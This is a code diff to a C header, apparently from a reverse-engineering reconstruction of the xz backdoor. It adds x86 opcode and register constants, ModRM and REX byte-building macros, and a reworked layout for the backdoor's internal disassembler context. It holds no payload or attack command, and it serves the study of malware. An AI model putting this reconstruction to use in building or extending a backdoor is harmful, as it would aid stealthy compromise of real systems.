@@ -303,7 +303,16 @@ typedef struct {
 
 enum X86_OPCODE {
 	X86_OPCODE_LEA = 0x8D,
-	X86_OPCODE_CALL = 0xE8
+	X86_OPCODE_CALL = 0xE8,
+	// MOV 	r16/32/64 	r/m16/32/64
+	X86_OPCODE_MOV_LOAD = 0x8B,
+	// MOV 	m16 	Sreg 									Move
+	// MOV 	r16/32/64 	Sreg
+	X86_OPCODE_MOV_STORE = 0x8C
+};
+
+enum X86_REG {
+	X86_REG_RBP = 5
 };
 
 typedef int BOOL;
@@ -666,6 +675,44 @@ assert_offset(elf_entry_ctx_t, symbol_ptr, 0);
 assert_offset(elf_entry_ctx_t, got_ctx, 0x8);
 assert_offset(elf_entry_ctx_t, frame_address, 0x28);
 
+/**
+ * creates the MOD.RM byte, given its components
+ */
+#define X86_MODRM_BYTE(mod, reg, rm) \
+	((u8)(0 \
+		| (u8)(((mod) & 3) << 6) \
+		| (u8)(((reg) & 7) << 3) \
+		| (u8)(((rm) & 7)) \
+	))
+
+#define X86_REX_BYTE(w,r,x,b) \
+	((u8)(0x40 \
+		| (u8)(((w) & 1) << 3) \
+		| (u8)(((r) & 1) << 2) \
+		| (u8)(((x) & 1) << 1) \
+		| (u8)(((b) & 1) << 0) \
+	))
+
+#define X86_REX_W X86_REX_BYTE(1,0,0,0)
+
+/**
+ * creates the backdoor's MOD.RM word (MOD.RM and its individual components)
+ */
+#define XZDASM_MODRM_MAKE(mod, reg, rm) \
+	((u32)(0 \
+		| (u32)(((rm) & 0xFF)<< 24) \
+		| (u32)(((reg) & 0xFF) << 16) \
+		| (u32)(((mod) & 0xFF) << 8) \
+		| X86_MODRM_BYTE(mod, reg, rm) \
+	))
+
+enum dasm_modrm_mask {
+	XZ_MODRM_RM  = 0xFF000000,
+	XZ_MODRM_REG = 0x00FF0000,
+	XZ_MODRM_MOD = 0x0000FF00,
+	XZ_MODRM_RAW = 0x000000FF
+};
+
 typedef struct __attribute__((packed)) dasm_ctx {
 	u8* instruction;
 	u64 instruction_size;
@@ -687,13 +734,23 @@ typedef struct __attribute__((packed)) dasm_ctx {
 			u8 vex_byte;
 			u8 vex_byte2;
 			u8 vex_byte3;
-			u8 rex_byte;
 			union {
 				struct __attribute__((packed)) {
-					u8 modrm;
-					u8 modrm_mod;
-					u8 modrm_reg;
-					u8 modrm_rm;
+					u8 B : 1;
+					u8 X : 1;
+					u8 R : 1;
+					u8 W : 1;
+					u8 BitPattern : 4; // always 0100b
+				};
+				u8 rex_byte;
+			};
+			union {
+				// in little endian order
+				struct __attribute__((packed)) {
+					/* 3 */ u8 modrm;
+					/* 2 */ u8 modrm_mod;
+					/* 1 */ u8 modrm_reg;
+					/* 0 */ u8 modrm_rm;
 				};
 				u32 modrm_word;
 			};
